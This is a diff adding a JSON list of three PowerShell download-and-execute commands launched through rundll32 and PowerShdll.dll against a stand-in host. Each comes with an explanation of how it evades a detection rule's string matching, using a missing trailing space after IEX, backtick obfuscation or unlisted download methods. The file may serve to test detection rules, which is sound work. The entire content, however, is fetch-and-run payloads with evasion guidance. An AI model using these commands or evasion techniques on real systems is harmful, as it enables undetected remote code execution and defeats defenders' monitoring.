@@ -1,0 +1,14 @@
+[
+  {
+    "output": "rundll32.exe PowerShdll.dll,main -c \"IEX(New-Object Net.WebClient).DownloadData('http://example.com/payload')\"",
+    "explanation": "Bypasses the rule by omitting the space after 'IEX' (the rule explicitly looks for 'IEX ' with a trailing space) and by using 'DownloadData' instead of the flagged 'DownloadString' method."
+  },
+  {
+    "output": "rundll32.exe PowerShdll.dll,main -c \"I`e`x (New-Object Net.WebClient).D`o`wnloadString('http://example.com/payload')\"",
+    "explanation": "Bypasses the command line string matching by utilizing PowerShell backtick obfuscation. The rule checks for exact contiguous strings like 'IEX ' and 'DownloadString', which are broken up by the backticks without affecting PowerShell's execution."
+  },
+  {
+    "output": "rundll32.exe PowerShdll.dll,main -c \"Invoke-RestMethod -Uri http://example.com/payload | IEX\"",
+    "explanation": "Bypasses the rule by using 'Invoke-RestMethod' (which is not in the selection\\_cli list) to download the payload, and placing 'IEX' at the end of the pipeline where it does not have a trailing space."
+  }
+]
